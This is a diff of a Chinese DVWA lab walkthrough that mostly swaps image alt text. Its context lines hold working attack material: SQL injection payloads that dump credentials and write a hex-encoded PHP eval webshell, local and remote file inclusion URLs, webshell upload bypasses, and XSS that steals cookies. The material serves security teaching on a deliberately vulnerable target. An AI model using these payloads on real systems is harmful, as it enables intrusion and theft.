@@ -1,5 +1,9 @@
 # DVWA-WalkThrough
 
+<p align="center">
+    <img src="../../../../assets/img/logo/dvwa.png" width="15%"></a>
+</p>
+
 ---
 
 ## 免责声明
@@ -41,9 +45,9 @@
 
 推荐用 [phpstudy](http://phpstudy.php.cn/) 进行快速搭建
 
-![image](../../../../assets/img/安全/实验/Misc/dvwa/dvwa1.png)
-![image](../../../../assets/img/安全/实验/Misc/dvwa/dvwa2.png)
-![image](../../../../assets/img/安全/实验/Misc/dvwa/dvwa3.png)
+![](../../../../assets/img/安全/实验/Misc/dvwa/dvwa1.png)
+![](../../../../assets/img/安全/实验/Misc/dvwa/dvwa2.png)
+![](../../../../assets/img/安全/实验/Misc/dvwa/dvwa3.png)
 
 修改 config.inc.php,配置数据库密码 `$_DVWA[ 'db_password' ] = 'root';`
 
@@ -53,7 +57,7 @@
 
 **难度**
 
-![image](../../../../assets/img/安全/实验/Misc/dvwa/dvwa4.png)
+![](../../../../assets/img/安全/实验/Misc/dvwa/dvwa4.png)
 
 ---
 
@@ -105,21 +109,21 @@ if( isset( $_GET[ 'Login' ] ) ) {
 0. burp 的安装过程略
 1. 抓包
 2. ctrl+I 将包复制到 intruder 模块,因为要对 password 参数进行爆破,所以在 password 参数的内容两边加 $
-![image](../../../../assets/img/安全/实验/Misc/dvwa/dvwa5.png)
+![](../../../../assets/img/安全/实验/Misc/dvwa/dvwa5.png)
 
 3. 选中 Payloads,载入字典,点击 Start attack 进行爆破
-![image](../../../../assets/img/安全/实验/Misc/dvwa/dvwa6.png)
-![image](../../../../assets/img/安全/实验/Misc/dvwa/dvwa7.png)
+![](../../../../assets/img/安全/实验/Misc/dvwa/dvwa6.png)
+![](../../../../assets/img/安全/实验/Misc/dvwa/dvwa7.png)
 
 4. 最后,尝试在爆破结果中找到正确的密码,可以看到 password 的响应包长度(length)"与众不同",可推测 password 为正确密码,手工验证登陆成功.
 
 **手工 sql 注入**
 
 1. Username : admin' or '1'='1 Password :(空),此时 sql 语句如下图:
-![image](../../../../assets/img/安全/实验/Misc/dvwa/dvwa8.png)
+![](../../../../assets/img/安全/实验/Misc/dvwa/dvwa8.png)
 
 2. Username :admin' # Password :(空),此时 sql 语句如下图:
-![image](../../../../assets/img/安全/实验/Misc/dvwa/dvwa9.png)
+![](../../../../assets/img/安全/实验/Misc/dvwa/dvwa9.png)
 
 ### Medium
 
@@ -221,7 +225,7 @@ generateSessionToken();
 High级别的代码加入了 Token,可以抵御 CSRF 攻击,同时也增加了爆破的难度,通过抓包,可以看到,登录验证时提交了四个参数:username、password、Login 以及 user_token.
 
 每次服务器返回的登陆页面中都会包含一个随机的 user_token 的值,用户每次登录时都要将 user_token 一起提交.服务器收到请求后,会优先做 token 的检查,再进行 sql 查询.
-![image](../../../../assets/img/安全/实验/Misc/dvwa/dvwa10.png)
+![](../../../../assets/img/安全/实验/Misc/dvwa/dvwa10.png)
 
 同时,High 级别的代码中,使用了 stripslashes(去除字符串中的反斜线字符,如果有两个连续的反斜线,则只去掉一个)、 mysql_real_escape_string 对参数 username、password 进行过滤、转义,进一步抵御 sql 注入.
 
@@ -315,7 +319,7 @@ for key in open("password.txt"):
     if (i == 100):
         break
 ```
-![image](../../../../assets/img/安全/实验/Misc/dvwa/dvwa11.png)
+![](../../../../assets/img/安全/实验/Misc/dvwa/dvwa11.png)
 
 代码写的烂,不要笑话其实用这个匹配是最关键的 `user_token = re.findall(r"name='user_token' value='(.+?)'",content)[0]`
 
@@ -327,7 +331,7 @@ import urllib3.request
     proxy = urllib3.ProxyManager('http://127.0.0.1:8080', headers=header)
     req = proxy.request('POST', url=requrl)
 ```
-![image](../../../../assets/img/安全/实验/Misc/dvwa/dvwa12.png)
+![](../../../../assets/img/安全/实验/Misc/dvwa/dvwa12.png)
 
 另外,可以使用 burp 的插件 CSRF Token Tracker 捕捉 token,请自行研究
 
@@ -743,7 +747,7 @@ if( isset( $_GET[ 'Change' ] ) ) {
 
 <h2>file not found.<h2>
 ```
-![image](../../../../assets/img/安全/实验/Misc/dvwa/dvwa13.png)
+![](../../../../assets/img/安全/实验/Misc/dvwa/dvwa13.png)
 
 ### Medium
 
@@ -810,7 +814,7 @@ $_SERVER['SERVER_NAME']:PHP 中获取服务器主机的名称,即 HTTP 数据包
 
 我们可以将攻击页面命名为 <dvwa靶机的IP地址>.html 就可以绕过了
 
-![image](../../../../assets/img/安全/实验/Misc/dvwa/dvwa14.png)
+![](../../../../assets/img/安全/实验/Misc/dvwa/dvwa14.png)
 
 ### High
 
@@ -910,7 +914,7 @@ generateSessionToken();
 
 为了方便测试,在 x.js 里只写了 `alert('HelloDVWA')`
 
-![image](../../../../assets/img/安全/实验/Misc/dvwa/dvwa82.png)
+![](../../../../assets/img/安全/实验/Misc/dvwa/dvwa82.png)
 
 发现成功了!!!x.js 被成功加载了.但多次加载还是有问题
 
@@ -999,7 +1003,7 @@ generateSessionToken();
 File Inclusion,意思是文件包含(漏洞),是指当服务器开启 allow_url_include 选项时,就可以通过 php 的某些特性函数(include(),require() 和 include_once(),require_once())利用 url 去动态包含文件,此时如果没有对文件来源进行严格审查,就会导致任意文件读取或者任意命令执行.文件包含漏洞分为本地文件包含漏洞与远程文件包含漏洞,远程文件包含漏洞是因为开启了 php 置中的 allow_url_fopen 选项(选项开启之后,服务器允许包含一个远程的文件).
 
 phpstudy开一下这2个参数
-![image](../../../../assets/img/安全/实验/Misc/dvwa/dvwa15.png)
+![](../../../../assets/img/安全/实验/Misc/dvwa/dvwa15.png)
 
 ### Low
 
@@ -1019,7 +1023,7 @@ $file = $_GET[ 'page' ];
 
 点击 file1.php 后,显示如下
 
-![image](../../../../assets/img/安全/实验/Misc/dvwa/dvwa16.png)
+![](../../../../assets/img/安全/实验/Misc/dvwa/dvwa16.png)
 
 而现实中,恶意的攻击者是不会乖乖点击这些链接的,因此 page 参数是不可控的.
 
@@ -1028,13 +1032,13 @@ $file = $_GET[ 'page' ];
 构造 url`http://<IP地址!!!>/dvwa/vulnerabilities/fi/page=/etc/shadow`
 报错,显示没有这个文件,说明不是服务器系统不是 Linux,但同时暴露了服务器文件的绝对路径
 
-![image](../../../../assets/img/安全/实验/Misc/dvwa/dvwa17.png)
+![](../../../../assets/img/安全/实验/Misc/dvwa/dvwa17.png)
 
 - **构造url(绝对路径)**
 
     `http://<IP地址!!!>/dvwa/vulnerabilities/fi/page=C:/phpStudy/PHPTutorial/WWW/DVWA/php.ini`
 
-    ![image](../../../../assets/img/安全/实验/Misc/dvwa/dvwa18.png)
+    ![](../../../../assets/img/安全/实验/Misc/dvwa/dvwa18.png)
 
     成功读取了服务器的 php.ini 文件
 
@@ -1046,7 +1050,7 @@ $file = $_GET[ 'page' ];
 
     加这么多 ../ 是为了保证到达服务器的C盘根目录,可以看到读取是成功的.
 
-    ![image](../../../../assets/img/安全/实验/Misc/dvwa/dvwa19.png)
+    ![](../../../../assets/img/安全/实验/Misc/dvwa/dvwa19.png)
 
     同时我们看到,配置文件中的 Magic_quote_gpc 选项为 off.在 php 版本小于 5.3.4 的服务器中,当 Magic_quote_gpc 选项为 off 时,我们可以在文件名中使用 %00 进行截断,也就是说文件名中 %00 后的内容不会被识别,即下面两个 url 是完全等效的.
 
@@ -1073,7 +1077,7 @@ phpinfo();
 
 成功在服务器上执行了 phpinfo 函数
 
-![image](../../../../assets/img/安全/实验/Misc/dvwa/dvwa20.png)
+![](../../../../assets/img/安全/实验/Misc/dvwa/dvwa20.png)
 
 为了增加隐蔽性,可以对 http://<服务器B IP地址!!!>/phpinfo.txt 进行 URL 编码
 
@@ -1125,13 +1129,13 @@ $file = str_replace( array( "../", "..\"" ), "", $file );
 
 `http://<IP地址!!!>/dvwa/vulnerabilities/fi/?page=..././..././..././..././..././..././..././..././..././phpStudy/PHPTutorial/WWW/DVWA/php.ini` 读取配置文件成功
 
-![image](../../../../assets/img/安全/实验/Misc/dvwa/dvwa21.png)
+![](../../../../assets/img/安全/实验/Misc/dvwa/dvwa21.png)
 
 **远程文件包含**
 
 `http://<IP地址!!!>/dvwa/vulnerabilities/fi/?page=hhttp://ttp://<服务器B IP地址!!!>/phpinfo.txt` 远程执行命令成功
 
-![image](../../../../assets/img/安全/实验/Misc/dvwa/dvwa22.png)
+![](../../../../assets/img/安全/实验/Misc/dvwa/dvwa22.png)
 
 经过编码后的 url 不能绕过替换规则,因为解码是在浏览器端完成的,发送过去的 page 参数依然是http://<IP地址!!!>/phpinfo.txt,因此读取失败.
 
@@ -1170,7 +1174,7 @@ High 级别的代码规定只能包含 file 开头的文件,看似安全,不幸�
 
 构造 url `http://<IP地址!!!>/dvwa/vulnerabilities/fi/?page=file://C:/phpStudy/PHPTutorial/WWW/DVWA/php.ini`
 
-![image](../../../../assets/img/安全/实验/Misc/dvwa/dvwa23.png)
+![](../../../../assets/img/安全/实验/Misc/dvwa/dvwa23.png)
 
 至于执行任意命令,需要配合文件上传漏洞利用.首先需要上传一个内容为 php 的文件,然后再利用 file 协议去包含上传文件(需要知道上传文件的绝对路径),从而实现任意命令执行.
 
@@ -1281,17 +1285,17 @@ if( isset( $_POST[ 'Upload' ] ) ) {
 
 上传成功,并且返回了上传路径
 
-![image](../../../../assets/img/安全/实验/Misc/dvwa/dvwa24.png)
+![](../../../../assets/img/安全/实验/Misc/dvwa/dvwa24.png)
 
 注:这里推荐用开源的 [antSword](https://github.com/AntSwordProject/antSword) 连接webshell,安装步骤这里略
 
 `http://<IP地址!!!>/dvwa/hackable/uploads/shell.php`
 
-![image](../../../../assets/img/安全/实验/Misc/dvwa/dvwa25.png)
+![](../../../../assets/img/安全/实验/Misc/dvwa/dvwa25.png)
 
 然后 antSword 就会通过向服务器发送包含 ant 参数的 post 请求,在服务器上执行任意命令,获取 webshell 权限.可以下载、修改服务器的所有文件.
 
-![image](../../../../assets/img/安全/实验/Misc/dvwa/dvwa26.png)
+![](../../../../assets/img/安全/实验/Misc/dvwa/dvwa26.png)
 
 ### Medium
 
@@ -1338,7 +1342,7 @@ if( isset( $_POST[ 'Upload' ] ) ) {
 
 因为采用的是一句话木马,所以文件大小不会有问题,至于文件类型的检查,尝试修改文件名为 shell.png , 上传成功
 
-![image](../../../../assets/img/安全/实验/Misc/dvwa/dvwa27.png)
+![](../../../../assets/img/安全/实验/Misc/dvwa/dvwa27.png)
 
 尝试使用 antSword 连接,不幸的是,虽然成功上传了文件,但是并不能成功获取 webshell 权限,在 antSword 上会报错
 
@@ -1351,17 +1355,17 @@ if( isset( $_POST[ 'Upload' ] ) ) {
 
 注: 这里的 post 需要一个带 Medium 级别的 cookie 请求,antSword 现在貌似不支持带 cookie 访问,我是自己配置 burp 代理,用 burp 抓包加上 cookie 进行访问的
 
-![image](../../../../assets/img/安全/实验/Misc/dvwa/dvwa28.png)
-![image](../../../../assets/img/安全/实验/Misc/dvwa/dvwa29.png)
+![](../../../../assets/img/安全/实验/Misc/dvwa/dvwa28.png)
+![](../../../../assets/img/安全/实验/Misc/dvwa/dvwa29.png)
 
 **抓包修改文件类型**
 上传 shell.png 文件,抓包.
 
-![image](../../../../assets/img/安全/实验/Misc/dvwa/dvwa30.png)
+![](../../../../assets/img/安全/实验/Misc/dvwa/dvwa30.png)
 
 可以看到文件类型为 image/png,尝试修改 filename 为 shell.php.
 
-![image](../../../../assets/img/安全/实验/Misc/dvwa/dvwa31.png)
+![](../../../../assets/img/安全/实验/Misc/dvwa/dvwa31.png)
 
 上传成功.上 antSword 连接
 
@@ -1369,10 +1373,10 @@ if( isset( $_POST[ 'Upload' ] ) ) {
 
 在 php 版本小于 5.3.4 的服务器中,当 Magic_quote_gpc 选项为 off 时,可以在文件名中使用 %00 截断,所以可以把上传文件命名为 shell.php%00.png.
 
-![image](../../../../assets/img/安全/实验/Misc/dvwa/dvwa32.png)
+![](../../../../assets/img/安全/实验/Misc/dvwa/dvwa32.png)
 
 可以看到,包中的文件类型为 image/png,可以通过文件类型检查.上传成功.
-![image](../../../../assets/img/安全/实验/Misc/dvwa/dvwa33.png)
+![](../../../../assets/img/安全/实验/Misc/dvwa/dvwa33.png)
 
 而服务器会认为其文件名为 shell.php,顺势解析为 php 文件.
 
@@ -1450,11 +1454,11 @@ GIF - 文件头标识 (6 bytes)   47 49 46 38 39(37) 61 |GIF89(7)a
 
 `copy 1.jpg/b+php.php/a shell.jpg`
 
-![image](../../../../assets/img/安全/实验/Misc/dvwa/dvwa34.png)
+![](../../../../assets/img/安全/实验/Misc/dvwa/dvwa34.png)
 
 打开可以看到,一句话木马藏到了最后.顺利通过文件头检查,可以成功上传.
 
-![image](../../../../assets/img/安全/实验/Misc/dvwa/dvwa35.png)
+![](../../../../assets/img/安全/实验/Misc/dvwa/dvwa35.png)
 
 注:我在 win10 裸机上进行的 phpstury 环境搭建,在这一步上传过程中,一直失败,后来发现是 windows defender 把上传上来的图片马杀掉了,所以出现同类问题可以检查下杀软情况
 
@@ -1464,7 +1468,7 @@ antSword 连接:
 
 这里和上面一样,自己抓包加上 cookie
 
-![image](../../../../assets/img/安全/实验/Misc/dvwa/dvwa36.png)
+![](../../../../assets/img/安全/实验/Misc/dvwa/dvwa36.png)
 
 ### Impossible
 
@@ -1571,7 +1575,7 @@ $_DVWA[ 'recaptcha_private_key' ] = '你的私钥';
 
 这一模块的验证码使用的是 Google 提供 reCAPTCHA 服务,下图是验证的具体流程.
 
-![image](../../../../assets/img/安全/实验/Misc/dvwa/dvwa37.png)
+![](../../../../assets/img/安全/实验/Misc/dvwa/dvwa37.png)
 
 服务器通过调用 recaptcha_check_answer 函数检查用户输入的正确性.
 
@@ -1669,7 +1673,7 @@ if( isset( $_POST[ 'Change' ] ) && ( $_POST[ 'step' ] == '2' ) ) {
 
 首先输入密码,点击 Change 按钮,抓包,更改 step 参数绕过验证码:
 
-![image](../../../../assets/img/安全/实验/Misc/dvwa/dvwa38.png)
+![](../../../../assets/img/安全/实验/Misc/dvwa/dvwa38.png)
 
 ps:因为没有翻墙,所以没能成功显示验证码,发送的请求包中也就没有 recaptcha_challenge_field、recaptcha_response_field 两个参数
 
@@ -1798,7 +1802,7 @@ if( isset( $_POST[ 'Change' ] ) && ( $_POST[ 'step' ] == '2' ) ) {
 
 **可以通过抓包,更改 step 参数,增加 passed_captcha 参数,绕过验证码.**
 
-![image](../../../../assets/img/安全/实验/Misc/dvwa/dvwa39.png)
+![](../../../../assets/img/安全/实验/Misc/dvwa/dvwa39.png)
 
 **CSRF**
 
@@ -1899,11 +1903,11 @@ generateSessionToken();
 
 第一步依旧是抓包
 
-![image](../../../../assets/img/安全/实验/Misc/dvwa/dvwa40.png)
+![](../../../../assets/img/安全/实验/Misc/dvwa/dvwa40.png)
 
 更改参数 recaptcha_response_field 以及 http 包头的 User-Agent
 
-![image](../../../../assets/img/安全/实验/Misc/dvwa/dvwa41.png)
+![](../../../../assets/img/安全/实验/Misc/dvwa/dvwa41.png)
 
 注:在最新版的 dvwa 中这里要改成 `g-recaptcha-response=hidd3n_valu3`
 
@@ -2056,15 +2060,15 @@ if( isset( $_REQUEST[ 'Submit' ] ) ) {
 
     输入 `1`,查询成功:
 
-    ![image](../../../../assets/img/安全/实验/Misc/dvwa/dvwa42.png)
+    ![](../../../../assets/img/安全/实验/Misc/dvwa/dvwa42.png)
 
     输入 `1'and '1' ='2`,查询失败,返回结果为空:
 
-    ![image](../../../../assets/img/安全/实验/Misc/dvwa/dvwa43.png)
+    ![](../../../../assets/img/安全/实验/Misc/dvwa/dvwa43.png)
 
     输入 `1'or '1'='1`,查询成功:
 
-    ![image](../../../../assets/img/安全/实验/Misc/dvwa/dvwa44.png)
+    ![](../../../../assets/img/安全/实验/Misc/dvwa/dvwa44.png)
 
     返回了多个结果,说明存在字符型注入.
 
@@ -2074,12 +2078,12 @@ if( isset( $_REQUEST[ 'Submit' ] ) ) {
 
     输入 `1' or 1=1 order by 1 #`,查询成功:
 
-    ![image](../../../../assets/img/安全/实验/Misc/dvwa/dvwa45.png)
+    ![](../../../../assets/img/安全/实验/Misc/dvwa/dvwa45.png)
 
     输入 `1' or 1=1 order by 2 #`,查询成功
     输入 `1' or 1=1 order by 3 #`,查询失败:
 
-    ![image](../../../../assets/img/安全/实验/Misc/dvwa/dvwa46.png)
+    ![](../../../../assets/img/安全/实验/Misc/dvwa/dvwa46.png)
 
     说明执行的 SQL 查询语句中只有两个字段,即这里的 First name、Surname.
     (这里也可以通过输入 union select 1,2,3… 来猜解字段数)
@@ -2088,7 +2092,7 @@ if( isset( $_REQUEST[ 'Submit' ] ) ) {
 
     输入 `1' union select 1,2 #`,查询成功:
 
-    ![image](../../../../assets/img/安全/实验/Misc/dvwa/dvwa47.png)
+    ![](../../../../assets/img/安全/实验/Misc/dvwa/dvwa47.png)
 
     说明执行的 SQL 语句为 select First name,Surname from 表 where ID=’id’…
 
@@ -2098,7 +2102,7 @@ if( isset( $_REQUEST[ 'Submit' ] ) ) {
 
 	利用另一种方式 `1' union select user(),database() #`
 
-    ![image](../../../../assets/img/安全/实验/Misc/dvwa/dvwa48.png)
+    ![](../../../../assets/img/安全/实验/Misc/dvwa/dvwa48.png)
 
     说明当前的数据库为 dvwa.
 	union 查询结合了两个 select 查询结果,根据上面的 order by 语句我们知道查询包含两列,为了能够现实两列查询结果,我们需要用 union 查询结合我们构造的另外一个 select.注意在使用 union 查询的时候需要和主查询的列数相同.
@@ -2107,7 +2111,7 @@ if( isset( $_REQUEST[ 'Submit' ] ) ) {
 
     输入 `1' union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() #`,查询成功:
 
-    ![image](../../../../assets/img/安全/实验/Misc/dvwa/dvwa49.png)
+    ![](../../../../assets/img/安全/实验/Misc/dvwa/dvwa49.png)
 
     说明数据库 dvwa 中一共有两个表,guestbook 与 users.
 
@@ -2115,7 +2119,7 @@ if( isset( $_REQUEST[ 'Submit' ] ) ) {
 
     输入 `1' union select 1,group_concat(column_name) from information_schema.columns where table_name='users' #`,查询成功:
 
-    ![image](../../../../assets/img/安全/实验/Misc/dvwa/dvwa50.png)
+    ![](../../../../assets/img/安全/实验/Misc/dvwa/dvwa50.png)
 
     说明 users 表中有8个字段,分别是 user_id,first_name,last_name,user,password,avatar,last_login,failed_login.
 
@@ -2127,7 +2131,7 @@ if( isset( $_REQUEST[ 'Submit' ] ) ) {
 
 	或 `1' union select null,group_concat(concat_ws(char(32,58,32),user,password)) from users #`
 
-    ![image](../../../../assets/img/安全/实验/Misc/dvwa/dvwa51.png)
+    ![](../../../../assets/img/安全/实验/Misc/dvwa/dvwa51.png)
 
     这样就得到了 users 表中所有用户的 user_id,first_name,last_name,password 的数据.
 
@@ -2137,7 +2141,7 @@ if( isset( $_REQUEST[ 'Submit' ] ) ) {
 
 	得到 root 用户信息:
 
-	![image](../../../../assets/img/安全/实验/Misc/dvwa/dvwa76.png)
+	![](../../../../assets/img/安全/实验/Misc/dvwa/dvwa76.png)
 
 9. 读文件和写入拿 webshell
 
@@ -2153,7 +2157,7 @@ if( isset( $_REQUEST[ 'Submit' ] ) ) {
 
 	通过命令查看 secure-file-priv 的当前值 `show global variables like '%secure%';`
 
-	![image](../../../../assets/img/安全/实验/Misc/dvwa/dvwa77.png)
+	![](../../../../assets/img/安全/实验/Misc/dvwa/dvwa77.png)
 
 	由于我使用的是 PHPStudy 搭建的环境,MySQL 没有设置过 secure_file_priv 时,默认为 NULL
 
@@ -2169,13 +2173,13 @@ if( isset( $_REQUEST[ 'Submit' ] ) ) {
 
 		`1' union select 1,load_file('C:\\phpStudy\\PHPTutorial\\WWW\\dvwa\\index.php')#`
 
-		![image](../../../../assets/img/安全/实验/Misc/dvwa/dvwa78.png)
+		![](../../../../assets/img/安全/实验/Misc/dvwa/dvwa78.png)
 
 	- **利用 `into outfile()` 函数写入一句话拿 webshell**
 
 		不知道路径的情况下,先通过报错得出网站的绝对路径:`1' union select 'xx',2 into outfile 'xx'#`
 
-		![image](../../../../assets/img/安全/实验/Misc/dvwa/dvwa79.png)
+		![](../../../../assets/img/安全/实验/Misc/dvwa/dvwa79.png)
 
 		得到路径`C:\phpStudy\PHPTutorial\WWW\dvwa\vulnerabilities\sqli\source\low.php `
 
@@ -2185,7 +2189,7 @@ if( isset( $_REQUEST[ 'Submit' ] ) ) {
 
 		或者采用编码方式,如十六进制编码的方式 `1' union select 1,0x3C3F70687020406576616C28245F504F53545B27636D64275D293B3F3E into outfile 'C:\\phpStudy\\PHPTutorial\\WWW\\\x.php'#`
 
-		![image](../../../../assets/img/安全/实验/Misc/dvwa/dvwa80.png)
+		![](../../../../assets/img/安全/实验/Misc/dvwa/dvwa80.png)
 
 **sqlmap**
 
@@ -2244,7 +2248,7 @@ mysqli_close($GLOBALS["___mysqli_ston"]);
     抓包更改参数 id 为 `1' or 1=1`,报错
     抓包更改参数 id 为 `1 or 1=1 #`,查询成功
 
-    ![image](../../../../assets/img/安全/实验/Misc/dvwa/dvwa52.png)
+    ![](../../../../assets/img/安全/实验/Misc/dvwa/dvwa52.png)
 
     说明存在数字型注入.由于是数字型注入,服务器端的 mysql_real_escape_string 函数就形同虚设了,因为数字型注入并不需要借助引号.
 
@@ -2252,7 +2256,7 @@ mysqli_close($GLOBALS["___mysqli_ston"]);
 
     抓包更改参数 id 为 `1 order by 2 #`,查询成功:
 
-    ![image](../../../../assets/img/安全/实验/Misc/dvwa/dvwa53.png)
+    ![](../../../../assets/img/安全/实验/Misc/dvwa/dvwa53.png)
 
     抓包更改参数 id 为 `1 order by 3 #`,报错,说明执行的SQL查询语句中只有两个字段,即这里的 First name、Surname.
 
@@ -2260,7 +2264,7 @@ mysqli_close($GLOBALS["___mysqli_ston"]);
 
     抓包更改参数 id 为 `1 union select 1,2 #`,查询成功:
 
-    ![image](../../../../assets/img/安全/实验/Misc/dvwa/dvwa54.png)
+    ![](../../../../assets/img/安全/实验/Misc/dvwa/dvwa54.png)
 
     说明执行的SQL语句为 `select First name,Surname from 表 where ID=id…`
 
@@ -2276,13 +2280,13 @@ mysqli_close($GLOBALS["___mysqli_ston"]);
 
     抓包更改参数 id 为 `1 union select 1,group_concat(column_name) from information_schema.columns where table_name='users' #` ,查询失败
 
-    ![image](../../../../assets/img/安全/实验/Misc/dvwa/dvwa55.png)
+    ![](../../../../assets/img/安全/实验/Misc/dvwa/dvwa55.png)
 
     这是因为单引号被转义了,变成了 `\’`.
 
     可以利用 16 进制进行绕过,抓包更改参数 id 为 `1 union select 1,group_concat(column_name) from information_schema.columns where table_name=0x7573657273 #`
 
-    ![image](../../../../assets/img/安全/实验/Misc/dvwa/dvwa56.png)
+    ![](../../../../assets/img/安全/实验/Misc/dvwa/dvwa56.png)
 
     说明 users 表中有 8 个字段,分别是 user_id,first_name,last_name,user,password,avatar,last_login,failed_login.
 
@@ -2337,7 +2341,7 @@ if( isset( $_SESSION [ 'id' ] ) ) {
 
 输入 `1' or 1=1 union select group_concat(user_id,first_name,last_name),group_concat(password) from users #` ,查询成功:
 
-![image](../../../../assets/img/安全/实验/Misc/dvwa/dvwa57.png)
+![](../../../../assets/img/安全/实验/Misc/dvwa/dvwa57.png)
 
 需要特别提到的是,High 级别的查询提交页面与查询结果显示页面不是同一个,也没有执行 302 跳转,这样做的目的是为了防止一般的 sqlmap 注入,因为 sqlmap 在注入过程中,无法在查询提交页面上获取查询的结果,没有了反馈,也就没办法进一步注入.
 
@@ -2820,7 +2824,7 @@ if ($_SERVER['REQUEST_METHOD'] == "POST") {
 
 模拟管理员登录,在浏览器 1 里,点击 Generate,Burpsuite 抓包,发送到 Repeater,go 一次
 
-![image](../../../../assets/img/安全/实验/Misc/dvwa/dvwa58.png)
+![](../../../../assets/img/安全/实验/Misc/dvwa/dvwa58.png)
 
 请求头中:
 > Cookie: dvwaSession=17; security=low; PHPSESSID=7bpga2clgq6eragltl0r5ch0g2
@@ -2837,7 +2841,7 @@ if ($_SERVER['REQUEST_METHOD'] == "POST") {
 在无密码认证的情况下,成功登陆到界面:
 `http://<IP地址!!!>/vulnerabilities/weak_id/`
 
-![image](../../../../assets/img/安全/实验/Misc/dvwa/dvwa59.png)
+![](../../../../assets/img/安全/实验/Misc/dvwa/dvwa59.png)
 
 ### Medium
 
@@ -2859,7 +2863,7 @@ if ($_SERVER['REQUEST_METHOD'] == "POST") {
 
 模拟管理员登录,在浏览器 1 里,点击 Generate,burp 里发现:
 
-![image](../../../../assets/img/安全/实验/Misc/dvwa/dvwa60.png)
+![](../../../../assets/img/安全/实验/Misc/dvwa/dvwa60.png)
 
 请求头中:
 > Cookie: dvwaSession=19; security=medium; PHPSESSID=7bpga2clgq6eragltl0r5ch0g2
@@ -2877,7 +2881,7 @@ if ($_SERVER['REQUEST_METHOD'] == "POST") {
 在无密码认证的情况下,成功登陆到界面:
 `http://<IP地址!!!>/vulnerabilities/weak_id/`
 
-![image](../../../../assets/img/安全/实验/Misc/dvwa/dvwa61.png)
+![](../../../../assets/img/安全/实验/Misc/dvwa/dvwa61.png)
 
 ### High
 
@@ -2924,7 +2928,7 @@ if ($_SERVER['REQUEST_METHOD'] == "POST") {
 
 模拟管理员登录,在浏览器 1 里,点击 Generate,burp 里发现:
 
-![image](../../../../assets/img/安全/实验/Misc/dvwa/dvwa62.png)
+![](../../../../assets/img/安全/实验/Misc/dvwa/dvwa62.png)
 
 请求头中:
 > Cookie: dvwaSession=19; security=high; PHPSESSID=7bpga2clgq6eragltl0r5ch0g2
@@ -2941,7 +2945,7 @@ if ($_SERVER['REQUEST_METHOD'] == "POST") {
 
 `http://<IP地址!!!>/vulnerabilities/weak_id/`
 
-![image](../../../../assets/img/安全/实验/Misc/dvwa/dvwa63.png)
+![](../../../../assets/img/安全/实验/Misc/dvwa/dvwa63.png)
 
 ### Impossible
 
@@ -3000,7 +3004,7 @@ documen.write 属性
 
 `http://<IP地址!!!>/vulnerabilities/xss_d/?default=English<script>alert(/xss/);</script>`
 
-![image](../../../../assets/img/安全/实验/Misc/dvwa/dvwa64.png)
+![](../../../../assets/img/安全/实验/Misc/dvwa/dvwa64.png)
 
 #### Medium
 
@@ -3125,7 +3129,7 @@ file_put_contents('cookie.txt', $cookie);
 
 XSS 利用,得到 cookies
 
-![image](../../../../assets/img/安全/实验/Misc/dvwa/dvwa81.png)
+![](../../../../assets/img/安全/实验/Misc/dvwa/dvwa81.png)
 
 #### Medium
 
@@ -3249,7 +3253,7 @@ if( isset( $_POST[ 'btnSign' ] ) ) {
 
 name 一栏前端有字数限制,可以直接修改前端代码,也可以抓包修改
 
-![image](../../../../assets/img/安全/实验/Misc/dvwa/dvwa65.png)
+![](../../../../assets/img/安全/实验/Misc/dvwa/dvwa65.png)
 
 message 一栏输入 `<script>alert(/xss/)</script>` ,成功弹框
 
@@ -3409,14 +3413,14 @@ $page['body'] .= '
 
 如果不看源码的话.看检查器(F12),也可以知道一些被信任的网站.
 
-![image](../../../../assets/img/安全/实验/Misc/dvwa/dvwa66.png)
+![](../../../../assets/img/安全/实验/Misc/dvwa/dvwa66.png)
 
 当中的 pastebin 是什么网站呢？一个快速分享文本内容的网站,假如文本的内容是一段 js 代码呢？
 
 源码中提示我们的, 输入 https://pastebin.com/raw/VqHmJKjr
 其内容是 `alert(document.cookie)`
 
-![image](../../../../assets/img/安全/实验/Misc/dvwa/dvwa67.png)
+![](../../../../assets/img/安全/实验/Misc/dvwa/dvwa67.png)
 
 那么能如何进行攻击呢? 可以用 CSRF
 ```html
@@ -3453,7 +3457,7 @@ $page['body'] .= '
 ';
 ```
 
-![image](../../../../assets/img/安全/实验/Misc/dvwa/dvwa68.png)
+![](../../../../assets/img/安全/实验/Misc/dvwa/dvwa68.png)
 
 中级的问题在于使用了 'unsafe-inline' 'nonce-TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA=' 这个标签,
 
@@ -3510,15 +3514,15 @@ if (solve_button) {
 2. 因为 script 不同于 ajax,所以可以跨域发送的
 3. 服务器就根据 callback 请求,返回 solveSum({"answer":"15"}) , 就可以调用 high.js 中的 solveSum .
 
-![image](../../../../assets/img/安全/实验/Misc/dvwa/dvwa69.png)
+![](../../../../assets/img/安全/实验/Misc/dvwa/dvwa69.png)
 
 但如果有人将 callback 参数改成 `callback=alert(document.cookie)` 呢？
 返回的会是 `alert(document.cookie)//({"answer":"15"}) `...
 所以这是一个注入点
 
-![image](../../../../assets/img/安全/实验/Misc/dvwa/dvwa70.png)
+![](../../../../assets/img/安全/实验/Misc/dvwa/dvwa70.png)
 
-![image](../../../../assets/img/安全/实验/Misc/dvwa/dvwa71.png)
+![](../../../../assets/img/安全/实验/Misc/dvwa/dvwa71.png)
 
 ### Impossible
 
@@ -3697,13 +3701,13 @@ EOF;
 你可以打开控制台(F12),看看情况.
 你会看到这个 token,不是后台生成的,而是前台生成的...而前台生成的 token,是用 `md5("ChangeMe")` 而成的,而后台期待的 md5 是 `md5("success")` .
 
-![image](../../../../assets/img/安全/实验/Misc/dvwa/dvwa73.png)
+![](../../../../assets/img/安全/实验/Misc/dvwa/dvwa73.png)
 
 知道怎么回事情了？参数里有 token,然后和 `md5(str_rot13("success"))` 进行比较,一样就给你 well done.
 
 打开浏览器的开发者工具,先界面上输入 success,然后在控制台执行函数 `generate_token()` 提交,成功.
 
-![image](../../../../assets/img/安全/实验/Misc/dvwa/dvwa74.png)
+![](../../../../assets/img/安全/实验/Misc/dvwa/dvwa74.png)
 
 注: 先输入 success 然后 `generate_token()`
 
